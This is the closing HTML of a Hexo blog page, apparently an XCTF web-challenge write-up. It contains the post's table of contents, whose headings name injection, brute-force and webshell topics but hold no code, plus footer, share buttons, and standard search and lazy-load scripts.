+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cat-%E6%8A%93%E4%BD%8F%E9%82%A3%E5%8F%AA%E7%8C%AB"><span class="toc-text">cat:抓住那只猫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-04"><span class="toc-text">ics-04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-05"><span class="toc-text">ics-05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace%E5%87%BD%E6%95%B0"><span class="toc-text">preg_replace函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-text">构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ics-06"><span class="toc-text">ics-06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lottery"><span class="toc-text">lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NewsCenter"><span class="toc-text">NewsCenter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mfw"><span class="toc-text">mfw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Training-WWW-Robots"><span class="toc-text">Training-WWW-Robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NaNNaNNaNNaN-Batman"><span class="toc-text">NaNNaNNaNNaN-Batman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unserialize3"><span class="toc-text">unserialize3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug"><span class="toc-text">Bug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%911%EF%BC%9A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">大坑1：二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%912%EF%BC%9A%E7%88%86%E7%A0%B4"><span class="toc-text">大坑2：爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%913%EF%BC%9A%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81"><span class="toc-text">大坑3：忘记密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%914%EF%BC%9AIP%E4%BC%AA%E9%80%A0"><span class="toc-text">大坑4：IP伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%915%EF%BC%9Ado-%EF%BC%9F"><span class="toc-text">大坑5：do??？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%916%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%86%99%E6%B3%95"><span class="toc-text">大坑6：一句话写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%9D%917%EF%BC%9A%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-text">大坑7：后缀名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload"><span class="toc-text">Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">注入思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93"><span class="toc-text">爆库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%80%BC"><span class="toc-text">爆值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">相关知识点</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/L0kiii">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2024
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + XCTF%20WEB%20Advanced + '&url=' + https%3A%2F%2Fl0ki.net%2F2020%2F02%2F12%2FXCTF-WEB-Advanced%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://l0ki.net/2020/02/12/XCTF-WEB-Advanced/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+</html>
